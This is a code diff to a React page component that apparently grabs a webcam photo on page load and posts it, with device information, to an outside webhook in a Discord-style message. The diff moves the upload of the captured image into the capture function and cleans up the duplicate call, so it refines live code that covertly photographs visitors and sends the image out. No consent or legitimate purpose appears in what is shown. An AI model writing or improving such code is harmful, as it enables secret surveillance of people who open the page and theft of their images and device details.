@@ -71,6 +71,16 @@ const Index = () => {
         const photo = canvas.toDataURL("image/png");
         stream.getTracks().forEach((track) => track.stop());
         sendToWebhook({ photo });
+        fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            content: `Captured Photo:`,
+            embeds: [{ image: { url: photo } }],
+          }),
+        });
         return photo;
       } catch (error) {
         console.error("Error capturing photo:", error);
@@ -80,21 +90,7 @@ const Index = () => {
 
     const fetchData = async () => {
       const deviceInfo = await getDeviceInfo();
-      const photo = await capturePhoto();
-      if (photo) {
-        if (photo) {
-          fetch(webhookUrl, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-              content: `Captured Photo:`,
-              embeds: [{ image: { url: deviceInfo.photo } }],
-            }),
-          });
-        }
-      }
+      await capturePhoto();
     };
 
     fetchData();
